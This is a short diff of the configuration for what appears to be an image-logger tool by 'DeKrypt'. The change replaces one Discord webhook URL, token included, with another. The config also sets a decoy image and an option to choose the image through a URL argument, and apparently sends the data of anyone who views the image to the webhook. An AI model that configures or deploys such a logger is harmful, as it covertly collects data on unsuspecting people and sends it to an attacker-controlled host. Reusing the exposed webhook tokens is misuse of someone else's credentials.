@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1157024950872440973/yxWtxkU96FJ-zlSX71VTgBRFBeiRNxUbhodzQ7CGvekD-oSUG6ayFB6vc8kXdxBrGQdK",
+    "webhook": "https://discord.com/api/webhooks/1230453243042070558/b8rBODHxzRagpNBrjL5cpPEEbDrfjngE2icghEVa-wKCSJfwenZTYgFyI5T7EwChjhOL",
     "image": "https://i0.wp.com/sa.news-sinaa.com/wp-content/uploads/2023/08/%D9%83%D9%8A%D9%81-%D8%AD%D8%A7%D9%84%D9%83-%D9%8A%D8%A7-%D8%AC%D9%88%D8%AC%D9%84-3.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
